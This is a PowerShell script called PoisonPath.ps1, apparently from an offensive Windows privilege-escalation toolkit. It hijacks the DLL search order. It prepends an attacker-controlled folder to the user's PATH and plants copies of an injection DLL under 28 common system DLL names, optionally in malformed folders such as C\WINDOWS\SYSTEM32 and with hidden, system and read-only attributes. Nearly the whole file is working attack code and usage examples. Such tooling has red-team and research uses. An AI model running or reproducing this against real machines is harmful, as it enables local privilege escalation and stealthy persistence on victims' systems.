<#

PoisonPath.ps1 

A component of Windows 7.x, 8.x, and 10.x Local Elevation of Attacker's Privileges Toolkit (#LEAPKit) 
by Greg Linares (@Laughing_Mantis) of Cyberpoint SRT 

Poison Path is a simple script which will add a controlled folder to a user's 
PATH variable in order to hijack potential DLL Search Order vulnerabilities.  

This is a simple yet still a viable method to target applications who utilize insecure LoadLibraryEx calls 
and should be used prior to exploiting DLL path issues.

Current Version DLL Brute Force List:
VERSION.DLL,
imageres.dll,
msTracer.dll,
msfte.dll,
bcrypt.dll,
urlmon.dll,
SensApi.dll,
dbghelp.dll,
dbgcore.DLL,
USERENV.DLL,
MSIMG32.DLL,
RASAPI32.DLL,
dwrite.dll,
wow64log.dll,
tv_x64.dll,
OLEACC.dll,
OLEACCRC.dll,
DUI70.dll,
dwmapi.dll,
WINSTA.dll,
msvcp110.dll,
iertutil.dll,
PROPSYS.dll,
SspiCli.dll,
WINMM.dll,
WTSAPI32.dll,
Bcp47Langs.dll,
wincorlib.DLL


Usage:
Example 1: PoisonPath.ps1 -SHOW

This will display the current user's PATH variables and does not modify the variable.

Example 2: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin 

This will append the current user's PATH variable with the path "C:\Tools\LEAP\bin\"

Example 3: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -DLL C:\Tools\LEAP\bin\LEAPInject.dll

This will attempt to brute force a DLL hijack by abusing commonly requested DLL names and 
creating a PATH variable folder containg these DLL files.  This is achieved by placing
a copy of LEAPInject.dll for each DLL name listed in the DLL Brute Force List into 
the PATH variable.

Users can update this list with additional DLL files as they see fit in order to expand
capabilities of this tool kit.


Example 4: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -HIDDEN -DLL C:\Tools\LEAP\BIN\LEAPInject.dll

As Above, however the brute forced DLL files will be assigned the HIDDEN, SYSTEM, & 
READONLY attributes.

Example 5: PoisonPath.ps1 -BRUTE -BADNAMES -HIDDEN -DLL C:\Tools\LEAP\bin\LEAPInject.dll

This will attempt to trigger a DLL Hijack by creating a PATH entry of C:\Tools\LEAP\bin\ as well as
creating subfolders designed to take advantage of malformed folders searched via bad parsing code + DLLSearchOrder
examples of these folders are as follows:

-%PATH%\Windows\
-%PATH%\C\Windows\
-%PATH%\Windows\System32\
-%PATH%\C\Windows\System32\
-%PATH%\System32\

Resulting in Output similar to: 
Creating Malformed Named Folders to attempt to Hijack DLLSearchOrder
Created Folder: C:\tools\LEAP\bin\C
Created Folder: C:\tools\LEAP\bin\WINDOWS
Created Folder: C:\tools\LEAP\bin\SYSTEM32
Created Folder: C:\tools\LEAP\bin\C\WINDOWS
Created Folder: C:\tools\LEAP\bin\C\WINDOWS\SYSTEM32
Attempting Brute Force DLL Hijacking...
Planting VERSION.DLL in C:\tools\LEAP\bin\
Planting VERSION.DLL in C:\tools\LEAP\bin\C
Planting VERSION.DLL in C:\tools\LEAP\bin\WINDOWS
Planting VERSION.DLL in C:\tools\LEAP\bin\SYSTEM32
Planting VERSION.DLL in C:\tools\LEAP\bin\C\WINDOWS
Planting VERSION.DLL in C:\tools\LEAP\bin\C\WINDOWS\SYSTEM32
...

#>

Param
(
    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [ValidateScript({
        if(!(Test-Path  $_ -PathType Container))
        {
            throw "Input folder doesn't exist: $_"
        }
        $true
    })]
    [ValidateNotNullOrEmpty()]
    [string]$Path = $((Get-Location -PSProvider FileSystem).Path + "\bin\"),

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$BRUTE,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$HIDDEN,
    
    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$BADNAMES,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [string]$DLL = "",

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$Show
)



$DLLs = @("VERSION.DLL",
"imageres.dll",
"msTracer.dll",
"msfte.dll",
"bcrypt.dll",
"urlmon.dll",
"SensApi.dll",
"dbghelp.dll",
"dbgcore.DLL",
"USERENV.DLL",
"MSIMG32.DLL",
"RASAPI32.DLL",
"dwrite.dll",
"wow64log.dll",
"tv_x64.dll",
"OLEACC.dll",
"OLEACCRC.dll",
"DUI70.dll",
"dwmapi.dll",
"WINSTA.dll",
"msvcp110.dll",
"iertutil.dll",
"PROPSYS.dll",
"SspiCli.dll",
"WINMM.dll",
"WTSAPI32.dll",
"Bcp47Langs.dll",
"wincorlib.DLL")

$BADDIRs = @("C",
"WINDOWS",
"SYSTEM32",
"C\WINDOWS",
"C\WINDOWS\SYSTEM32")

$PathEnv = [Environment]::GetEnvironmentVariable("Path")

if ($Show)
{
    
    Write-Host "The current PATH Environment Variable is: $PathEnv" -ForegroundColor Green
    exit 
}

if (!(Test-Path  $Path -PathType Container))
{
    throw "Fatal Error: The specified folder: $Path does not exist"
}

if ($DLL.Length -eq 0)
{
    $DLL = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\LEAPInject.dll"
    
}

if (!(Test-Path $DLL))
{
    throw "Fatal Error: The specified file: $DLL does not exist."  
}

if ($BADNAMES)
{
    Write-Host "Creating Malformed Named Folders to attempt to Hijack DLLSearchOrder" -ForegroundColor Red
    foreach ($BADDIR in $BADDIRs)
    {
        New-Item -ItemType directory -Path $($Path + $BADDIR) -Force | Out-Null
        Write-Host "Created Folder: $($Path + $BADDIR)" -ForegroundColor Green
    }
}

if ($BRUTE)
{
    Write-Host "Attempting Brute Force DLL Hijacking..." -ForegroundColor Red
    foreach ($dllfile in $DLLs)
    {
        Write-Host "Planting $dllfile in $Path" -ForegroundColor Green
        Copy-Item $DLL $($Path + "\" + $dllfile) -Force
        if ($HIDDEN)
        {
            $hidefile = Get-Item $($Path + "\" + $dllfile) -Force
            $hidefile.Attributes = "Hidden", "System", "ReadOnly"
        }
        if ($BADNAMES)
        {
            foreach ($BADDIR in $BADDIRs)
            {
                Write-Host "Planting $dllfile in $($Path + $BADDIR)" -ForegroundColor Green
                Copy-Item $DLL $($Path + "\" + $BADDIR + "\" + $dllfile) -Force
                if ($HIDDEN)
                {
                    $hidefile = Get-Item $($Path + "\" + $BADDIR + $dllfile) -Force
                    $hidefile.Attributes = "Hidden", "System", "ReadOnly"
                }  
            }
        }
    }
}


Write-Host "Adding $Path to the PATH Environment variable" -ForegroundColor Red

[Environment]::SetEnvironmentVariable("PATH", $Path + ';' + $PathEnv, "User")

[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

$objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon 


$MyPath = Get-Process -id $pid | Select-Object -ExpandProperty Path
$objNotifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($MyPath)
$objNotifyIcon.BalloonTipIcon = "Info" 
$objNotifyIcon.BalloonTipText = "Hijacked the User's PATH variable.
Confirm with the Control Panel\User Accounts\User Accounts - Change My Env Variables Tab" 
$objNotifyIcon.BalloonTipTitle = "LEAP Toolkit"
 
$objNotifyIcon.Visible = $True 
$objNotifyIcon.ShowBalloonTip(8000)




